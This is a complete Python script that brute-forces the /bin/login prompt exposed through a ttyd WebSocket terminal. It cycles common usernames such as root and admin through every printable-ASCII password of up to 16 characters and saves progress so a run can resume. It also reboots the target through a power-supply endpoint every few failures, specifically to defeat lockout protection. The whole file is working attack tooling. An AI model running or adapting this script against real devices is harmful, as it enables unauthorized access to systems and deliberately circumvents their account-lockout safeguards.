"""
ttyd_fuzz.py - Brute-force fuzz /bin/login over a ttyd WebSocket terminal.

How it works:
  1. Open a WebSocket to ttyd (no HTTP auth required).
  2. Send the empty AuthToken frame to start the session.
  3. Wait for the "login:" prompt in the terminal output.
  4. Send a username followed by Enter.
  5. Wait for the "Password:" prompt.
  6. Send a password followed by Enter.
  7. Read the response:
       - If we see a shell prompt (#, $, >) -> success, stop.
       - If we see "incorrect" or "failure"  -> try next credential pair.
       - If the connection closes            -> reconnect and continue.
  8. If the PSU_REBOOT_URL env var is set, reboot the device after
     REBOOT_AFTER_N failures so it cannot accumulate any lockout state.

Passwords are generated by enumerating every printable-ASCII string
(0x20..0x7E) of length MIN_PASSWORD_LEN..MAX_PASSWORD_LEN, in
lexicographic order. For each generated password we try every username
in USERNAMES before advancing to the next password. Progress is
checkpointed to STATE_FILE after every attempt, so the run can be
killed (Ctrl-C, kill, power loss) and resumed from where it left off.

Usage:
  ttyd-fuzz [ws://host:7689/ws]

Environment variables:
  PSU_REBOOT_URL    HTTP endpoint that reboots the device when POSTed to.
                    Optional. Example: http://192.168.1.50/api/reboot
  REBOOT_AFTER_N    How many failures before a reboot. Default: 20.
  TTYD_FUZZ_STATE   Path to the JSON state file.
                    Default: ttyd_fuzz_state.json next to this script.
"""

import asyncio
import json
import os
import re
import sys
import time

import websockets # pyright: ignore[reportMissingImports]

try:
    import urllib.request

    _HAS_URLLIB = True
except ImportError:
    _HAS_URLLIB = False


# ---------------------------------------------------------------------------
# Configuration - edit these or extend as you learn more about the device
# ---------------------------------------------------------------------------

TARGET_DEFAULT = "ws://10.0.2.174:7689/ws"
AUTH_PAYLOAD = '{"AuthToken": ""}'

# Usernames to try. Every password is tried against each of these in turn
# before we advance to the next password.
USERNAMES = [
    "root",
    "admin",
    "user",
    "vodafone",
    "supervisor",
]

# Printable ASCII, 0x20 (space) through 0x7E (tilde). 95 characters.
# Order is lexicographic so resume-by-index is well defined.
CHARSET = "".join(chr(c) for c in range(0x20, 0x7F))
CHARSET_LEN = len(CHARSET)

# Inclusive password length range.
MIN_PASSWORD_LEN = 1
MAX_PASSWORD_LEN = 16

# Resume state file. Defaults to sitting next to this script so it
# survives `cd` changes.
DEFAULT_STATE_PATH = os.path.join(
    "/home/user/.ttyd_fuzz_state.json",
)
STATE_FILE = os.environ.get("TTYD_FUZZ_STATE", DEFAULT_STATE_PATH)
STATE_VERSION = 1

# Strings that appear in the terminal output when a login attempt fails.
FAIL_MARKERS = [
    b"incorrect",
    b"failure",
    b"failed",
    b"Invalid",
    b"denied",
]

# Strings that suggest we have a shell.
SUCCESS_MARKERS = [
    b"# ",
    b"$ ",
    b"> ",
    b"~]",
    b":/",
]

# How long to wait (seconds) for each expected prompt before giving up.
LOGIN_PROMPT_TIMEOUT = 6
PASSWD_PROMPT_TIMEOUT = 6
RESULT_TIMEOUT = 8

# Strip ANSI escape sequences before searching terminal output.
_ANSI_RE = re.compile(rb"\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")


def strip_ansi(data: bytes) -> bytes:
    return _ANSI_RE.sub(b"", data)


# ---------------------------------------------------------------------------
# PSU reboot helper
# ---------------------------------------------------------------------------

PSU_REBOOT_URL = os.environ.get("PSU_REBOOT_URL", "")
REBOOT_AFTER_N = int(os.environ.get("REBOOT_AFTER_N", "20"))
BOOT_SETTLE_SEC = 20  # seconds to wait after power-on before reconnecting


def psu_reboot() -> None:
    """POST to the PSU reboot endpoint if one is configured."""
    if not PSU_REBOOT_URL:
        return
    print(f"  [psu] rebooting via {PSU_REBOOT_URL} ...")
    try:
        req = urllib.request.Request(PSU_REBOOT_URL, method="POST", data=b"") # pyright: ignore[reportPossiblyUnboundVariable]
        urllib.request.urlopen(req, timeout=5) # pyright: ignore[reportPossiblyUnboundVariable]
        print(f"  [psu] waiting {BOOT_SETTLE_SEC}s for device to boot ...")
        time.sleep(BOOT_SETTLE_SEC)
    except Exception as exc:
        print(f"  [psu] reboot call failed: {exc}")


# ---------------------------------------------------------------------------
# Password generation and resume state
# ---------------------------------------------------------------------------


def passwords_at_length(length: int) -> int:
    """Total number of passwords of the given length."""
    return CHARSET_LEN**length


def password_at_index(length: int, index: int) -> str:
    """
    Return the index-th lexicographic password of the given length.
    Equivalent to itertools.product(CHARSET, repeat=length)[index] but O(length).
    """
    chars = []
    for _ in range(length):
        chars.append(CHARSET[index % CHARSET_LEN])
        index //= CHARSET_LEN
    return "".join(reversed(chars))


def fresh_state() -> dict:
    return {
        "version": STATE_VERSION,
        "charset": CHARSET,
        "usernames": list(USERNAMES),
        "length": MIN_PASSWORD_LEN,
        "password_index": 0,
        "username_index": 0,
        "attempts": 0,
        "failures": 0,
        "successful": None,
    }


def load_state() -> dict:
    """
    Load resume state from disk, or return a fresh starting state if absent.

    Refuses to resume if the saved charset or username list differs from the
    current configuration, so a config edit cannot silently skip passwords.
    """
    if not os.path.exists(STATE_FILE):
        return fresh_state()

    try:
        with open(STATE_FILE) as fh:
            state = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        print(f"[state] could not read {STATE_FILE}: {exc}")
        print(f"[state] delete it to start fresh, or fix and rerun")
        sys.exit(2)

    if state.get("version") != STATE_VERSION:
        print(f"[state] version mismatch in {STATE_FILE}; delete to restart")
        sys.exit(2)
    if state.get("charset") != CHARSET:
        print(f"[state] charset changed; delete {STATE_FILE} to restart")
        sys.exit(2)
    if state.get("usernames") != list(USERNAMES):
        print(f"[state] username list changed; delete {STATE_FILE} to restart")
        sys.exit(2)

    return state


def save_state(state: dict) -> None:
    """Atomically write the state file (write tmp, then rename)."""
    tmp = STATE_FILE + ".tmp"
    with open(tmp, "w") as fh:
        json.dump(state, fh)
    os.replace(tmp, STATE_FILE)


def advance_state(state: dict) -> bool:
    """
    Advance one position in the search space:
      username -> password -> length.
    Returns False if the entire space (up to MAX_PASSWORD_LEN) is exhausted.
    """
    state["username_index"] += 1
    if state["username_index"] >= len(USERNAMES):
        state["username_index"] = 0
        state["password_index"] += 1
        if state["password_index"] >= passwords_at_length(state["length"]):
            state["password_index"] = 0
            state["length"] += 1
            if state["length"] > MAX_PASSWORD_LEN:
                return False
    return True


def step(state: dict) -> bool:
    """Advance, persist, announce length transitions. False when done."""
    old_length = state["length"]
    has_more = advance_state(state)
    if has_more and state["length"] != old_length:
        done = passwords_at_length(old_length) * len(USERNAMES)
        print(
            f"-- completed length {old_length} ({done} attempts), "
            f"advancing to length {state['length']} --"
        )
    save_state(state)
    return has_more


# ---------------------------------------------------------------------------
# Core attempt logic
# ---------------------------------------------------------------------------


class LoginFailed(Exception):
    """Raised when /bin/login says the credentials were wrong."""


class UnexpectedClose(Exception):
    """Raised when the WebSocket closes before we got a result."""


class Timeout(Exception):
    """Raised when we stop seeing output and a prompt never appears."""


async def recv_until(
    ws,
    markers: list,
    timeout: float,
    accumulator: bytearray,
) -> bytearray:
    """
    Read WebSocket frames until one of `markers` appears in the accumulated
    terminal output, or `timeout` seconds elapse.

    Returns the accumulator (which now contains everything received so far).
    Raises Timeout if nothing matched within the timeout.
    """
    deadline = asyncio.get_event_loop().time() + timeout
    while True:
        remaining = deadline - asyncio.get_event_loop().time()
        if remaining <= 0:
            raise Timeout(f"timed out waiting for one of {markers!r}")
        try:
            raw = await asyncio.wait_for(ws.recv(), timeout=remaining)
        except asyncio.TimeoutError:
            raise Timeout(f"timed out waiting for one of {markers!r}")

        # ttyd frames: first byte is the frame type.
        if isinstance(raw, str):
            raw = raw.encode()
        if not raw:
            continue
        kind = raw[0:1]
        if kind != b"0":
            # Not terminal output (title/options frame); skip.
            continue

        accumulator.extend(raw[1:])
        clean = strip_ansi(bytes(accumulator))

        for marker in markers:
            if marker in clean:
                return accumulator


async def send_line(ws, text: str) -> None:
    """Send `text` followed by Enter as a ttyd input frame."""
    payload = b"0" + text.encode() + b"\r"
    await ws.send(payload)


async def try_login(url: str, username: str, password: str) -> bool:
    """
    Open a fresh WebSocket session and attempt one username/password pair.

    Returns True on success, False on wrong credentials.
    Raises Timeout / ConnectionClosedError / OSError on transport problems.
    """
    async with websockets.connect(
        url,
        subprotocols=["tty"],
        open_timeout=8,
        close_timeout=3,
    ) as ws:
        await ws.send(AUTH_PAYLOAD)

        buf = bytearray()

        try:
            await recv_until(ws, [b"login:"], LOGIN_PROMPT_TIMEOUT, buf)
        except Timeout:
            raise Timeout("never saw login: prompt")

        await send_line(ws, username)

        try:
            await recv_until(ws, [b"assword:"], PASSWD_PROMPT_TIMEOUT, buf)
        except Timeout:
            # Some configs skip the password prompt for certain usernames
            # (e.g. guest with no password). Check if we already have a shell.
            clean = strip_ansi(bytes(buf))
            if any(m in clean for m in SUCCESS_MARKERS):
                return True
            raise Timeout("never saw Password: prompt")

        await send_line(ws, password)

        try:
            await recv_until(
                ws,
                FAIL_MARKERS + SUCCESS_MARKERS,
                RESULT_TIMEOUT,
                buf,
            )
        except Timeout:
            # Inconclusive - treat as failure.
            return False

        clean = strip_ansi(bytes(buf))

        if any(m in clean for m in SUCCESS_MARKERS):
            return True

        return False


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------


async def fuzz(url: str) -> None:
    state = load_state()

    if state.get("successful"):
        creds = state["successful"]
        print(
            f"State file already records a success: "
            f"{creds['username']!r} / {creds['password']!r}"
        )
        print(f"Delete {STATE_FILE} to start a new run.")
        return

    print(f"Target  : {url}")
    print(f"Charset : {CHARSET_LEN} printable ASCII chars (0x20..0x7E)")
    print(f"Lengths : {MIN_PASSWORD_LEN}..{MAX_PASSWORD_LEN}")
    print(f"State   : {STATE_FILE}")
    print(
        f"Resume  : length={state['length']} "
        f"pwd_idx={state['password_index']} "
        f"user_idx={state['username_index']} "
        f"(prior attempts={state['attempts']}, failures={state['failures']})"
    )
    if PSU_REBOOT_URL:
        print(f"PSU     : {PSU_REBOOT_URL}  (reboot every {REBOOT_AFTER_N} failures)")
    print()

    while state["length"] <= MAX_PASSWORD_LEN:
        password = password_at_index(state["length"], state["password_index"])
        username = USERNAMES[state["username_index"]]
        state["attempts"] += 1

        # Reboot periodically if a PSU is wired in.
        if (
            PSU_REBOOT_URL
            and state["failures"] > 0
            and state["failures"] % REBOOT_AFTER_N == 0
        ):
            psu_reboot()

        label = (
            f"[len={state['length']:>2} "
            f"pwd={state['password_index']:>10} "
            f"u={state['username_index']}]"
        )
        print(f"{label} {username!r}:{password!r} ... ", end="", flush=True)

        sleep_after = 0.5
        success = False
        try:
            success = await try_login(url, username, password)
        except Timeout as exc:
            print(f"timeout ({exc})")
        except websockets.exceptions.ConnectionClosedError as exc:
            print(f"connection closed (code={exc.code})")
            sleep_after = 1.0
        except OSError as exc:
            print(f"network error ({exc})")
            sleep_after = 2.0
        else:
            if success:
                print()
                print("=" * 60)
                print(f"  SUCCESS:  {username!r} / {password!r}")
                print("=" * 60)
                state["successful"] = {"username": username, "password": password}
                save_state(state)
                return
            print("fail")

        if not success:
            state["failures"] += 1

        if not step(state):
            break

        # Small delay between attempts. /bin/login already imposes ~3s on
        # failure, but this adds breathing room for the device.
        await asyncio.sleep(sleep_after)

    print()
    print(f"Exhausted search space up to length {MAX_PASSWORD_LEN} without success.")


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_DEFAULT
    try:
        asyncio.run(fuzz(url))
    except KeyboardInterrupt:
        print("\nInterrupted.")
